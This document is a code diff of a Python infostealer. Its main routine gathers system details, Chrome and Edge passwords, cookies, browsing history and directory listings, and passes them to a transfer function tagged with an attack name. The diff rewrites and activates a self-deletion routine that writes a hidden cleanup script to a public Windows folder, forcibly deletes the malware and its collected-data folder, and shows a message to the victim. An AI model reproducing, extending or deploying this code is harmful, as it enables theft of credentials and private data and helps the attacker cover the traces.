@@ -489,157 +489,52 @@ def file_transefer(type_of_virus:bool,data:list,data_coolect:list,status,path):
 def encrypt_the_system():
     print('that is so dangerus prefer not to use so \nstill i am gonna give update later')
     return True
-def message_and_deletaion(working_directory,bat_fille):
-    string='''
-    list1=[]
+def message_and_deletaion(working_directory01,message_show_y_n,message):
+    write12='''
+    python_virus=list1[0]
+    working_directory=list1[1]
+    message_show_yn=list1[2]
+    messsage=list1[3]
     import os
     import time
-    time.sleep(3)
-    code_path_killer=list1[0]
-    code_path_bat=list1[1]
-    working_directory=list1[2]
-    message_y_n=list1[3]
-    message=list1[4]
-    if os.path.exists(code_path_killer):
-        os.remove(code_path_killer)
-    else:
-        pass
-    if os.path.exists(code_path_bat):
-        os.remove(code_path_bat)
-    if os.path.exists(working_directory):
-        try:
-            import shutil
-            shutil.rmtree(working_directory)
-        except Exception as e:
-            import os
-            x_fille=working_directory+'\\envirRRcomuni_0X0'
-            E_fille=working_directory+'\\sys_encrypted_001'
-            x_fille_name=os.listdir(x_fille)
-            for i in x_fille_name:
-                delet_path=x_fille+'\\'+i
-                os.remove(delet_path)
-            try:
-                os.rmdir(x_fille)
-            except Exception as e:
-                pass
-            E_fille_name=os.listdir(E_fille)
-            for i in E_fille_name:
-                delete_path=E_fille+'\\'+i
-                os.remove(delete_path)
-            try:
-                os.rmdir(E_fille)
-            except Exception as e:
-                pass
-            try:
-                os.rmdir(working_directory)
-            except Exception as e:
-                pass
-    else:
-        pass
-    if message_y_n:
-        text=message
-        color_avilable=True
-        try:
-            from termcolor import colored
-        except Exception as e:
-            color_avilable=False
-            pass
+    import shutil
+    import subprocess
+    time.sleep(5)
+    while os.path.exists(python_virus):
+        try:os.remove(python_virus)
+        except PermissionError:subprocess.run(['Cmd','del',python_virus])
+        except FileNotFoundError or FileExistsError:break
+    while os.path.exists(working_directory+'\\app_data'):
+        try:shutil.rmtree(working_directory+'\\app_data')
+        except PermissionError:
+            for dirpath, dirnames, filenames in os.walk(working_directory+'\\app_data'):
+                for filename in filenames:
+                    try:os.remove(dirpath+'\\'+filename)
+                    except PermissionError:subprocess.run(['Cmd','del',dirpath+'\\'+filename])
+                    except FileNotFoundError or FileExistsError:pass
+            break
+        except FileNotFoundError or FileExistsError:break
+    if message_show_yn:
+        str0=messsage
         import time
-        import os
-        if color_avilable:
-            def style(text1,text2,text3,c1,c2):
-                print(colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1))
-                print(colored('==|',color=c2)+'      '+colored('+',color=c2,attrs=['bold'])+'                  '+colored('*',color=c2,attrs=['bold'])+'                                          '+colored('|==',color=c2))
-                print(colored('==|',color=c1)+'                    '+colored('*',color=c1,attrs=['bold'])+'                         '+colored('*',color=c1,attrs=['bold'])+'                     '+colored('|==',color=c1))
-                print(colored('==|',color=c2)+'                                    '+colored('+',color=c1,attrs=['bold'])+'                          '+colored('*',color=c2,attrs=['bold'])+'    '+colored('|==',color=c2))
-                print(colored('==|',color=c1)+''+'{:^{}}'.format(colored(text1,color=c1,attrs=['bold']),81)+colored('|==',color=c1))
-                print(colored('==|',color=c2)+''+'{:^{}}'.format(colored(text2,color=c2,attrs=['bold']),81)+colored('|==',color=c2))
-                print(colored('==|',color=c1)+''+'{:^{}}'.format(colored(text3,color=c1,attrs=['bold']),81)+colored('|==',color=c1))
-                print(colored('==|',color=c2)+'                                               '+colored('+',color=c1,attrs=['bold'])+'                    '+colored('|==',color=c2))
-                print(colored('==|',color=c1)+'                      '+colored('+',color=c1,attrs=['bold'])+'                                        '+colored('*',color=c1,attrs=['bold'])+'    '+colored('|==',color=c1))
-                print(colored('==|',color=c2)+'       '+colored('*',color=c2,attrs=['bold'])+'                      '+colored('*',color=c1,attrs=['bold'])+'                          '+colored('*',color=c2,attrs=['bold'])+'          '+colored('|==',color=c2))
-                print(colored('==|',color=c1)+'       '+colored('+',color=c1,attrs=['bold'])+'                      '+colored('*',color=c2,attrs=['bold'])+'                          '+colored('+',color=c1,attrs=['bold'])+'          '+colored('|==',color=c1))
-                print(colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2))
-            if len(text)<=68:
-                text_list=text[0:]
-                text_list0=''
-                text_list1=''
-            elif len(text)<=136:
-                text_list=text[0:68]
-                text_list0=text[68:0]
-                text_list1=''
-            elif len(text)<=204:
-                text_list=text[0:68]
-                text_list0=text[68:136]
-                text_list1=text[136:]
-            else:
-                text_list='you are stupid :>'
-                text_list0='and cute <3'
-                text_list1="that's why you get hacked:0"
-            switch=True
-            while True:
-                if switch:
-                    c1='yellow'
-                    c2='blue'
-                    switch=False
-                else:
-                    c1='blue'
-                    c2='yellow'
-                    switch=True
-                style(text_list,text_list0,text_list1,c1,c2)
-                time.sleep(0.20)
-                os.system('cls')
-        else:
-            def style(text1,text2,text3):
-                print('==========================================================================')
-                print('==|      +                  *                                          |==')
-                print('==|                    *                         *                     |==')
-                print('==|                                    +                          *    |==')
-                print('==|'+'{:^{}}'.format(text1,68)+'|==')
-                print('==|'+'{:^{}}'.format(text2,68)+'|==')
-                print('==|'+'{:^{}}'.format(text3,68)+'|==')
-                print('==|                                               +                    |==')
-                print('==|                      +                                        *    |==')
-                print('==|       *                      *                          *          |==')
-                print('==========================================================================')
-            if len(text)<=68:
-                text_list=text[0:]
-                text_list0=''
-                text_list1=''
-            elif len(text)<=136:
-                text_list=text[0:68]
-                text_list0=text[68:0]
-                text_list1=''
-            elif len(text)<=204:
-                text_list=text[0:68]
-                text_list0=text[68:136]
-                text_list1=text[136:]
-            else:
-                text_list='you are stupid :>'
-                text_list0='and cute <3'
-                text_list1="that's why you get hacked:0"
-            style(text_list,text_list0,text_list1)
-    else:
-        pass'''
-    # !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-    nothing=input('enter anything to start deletaion prossess')
-    # !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-
-    list1=[__file__,bat_fille,working_directory,message_show_y_n,message]
-    ind=string.index('list1')
-    write12=string[0:ind+6]+str(list1)+string[ind+8:]
-    path_desktop=os.environ["USERPROFILE"]+'\\Desktop\\dont_open.py'
-    with open(path_desktop,'w')as pywrite:
+        import os 
+        charector='abcdefghijklmnopqrstuvwxyz1234567890. ABCDEFGHIJKLMNOPQRSTUVWXYZ[]:;"/\'\\<>,?-_+=&@!#$^*(){\}'
+        str1=['A' for _ in str0]
+        for char in charector:
+            for i in range(len(str0)):
+                for num,alp in enumerate(str0):
+                    if not str1[num]==alp:
+                        str1[num]=char
+            os.system('cls')
+            print(hi:=''.join(a for a in str1))
+            if str0==hi:break
+            time.sleep(0.20)
+        nothing=input()
+    '''
+    list1=[__file__,working_directory01,message_show_y_n,message]
+    with open('C:\\Users\\Public\\Public Downloads\\delete.py','w')as pywrite:
         pywrite.write(write12)
-        pywrite.close()
-    time.sleep(3)
-    command = f'pythonw "{path_desktop}"'
-    subprocess.Popen(command, shell=True)
-    quit()
-# path lists---------------------------------------------------------------------
-main_path=working_directory01+'\\app_data'
-# main_code-------------------------------------------------------------------------
-
+    os.system(f'cmd /k python C:\\Users\\Public\\Public Downloads\\delete.py')
 encoding_types = ["UTF-8","UTF-16","UTF-32","ASCII","ANSI","ISO-8859-1","Windows-1252","Unicode"]
 if system_info_collect:
         system_info_response=system_info(main_path+'\\system_info',encoding_types)
@@ -665,6 +560,5 @@ if encrypt_data_tf:encrypt_data_response=encrypt_data(main_path,true_false[13])
 else:encrypt_data_response=False
 info=[system_info_response if system_info_collect else None,chrome_data_basic_response if chrome_data else None,chrome_id_password_c_response if chrome_id_passsword else None,chrome_web_data_response if web_data else None,history_data_response if history_data_tf else None,edge_data_response if edge_data_tf else None,dir_search_ifnfo_response if dir_search_ifnfo else None,encrypt_data_response if encrypt_data_tf else None]
 file_transefer(type_of_virus=type_of_virus_oftf,data=[key,name_of_attack],data_coolect=info,status=str(datetime.now()),path=main_path)
-# message_and_deletaion()
-# message_and_deletaion()
+message_and_deletaion(working_directory01,message_show_y_n,message)
 quit()
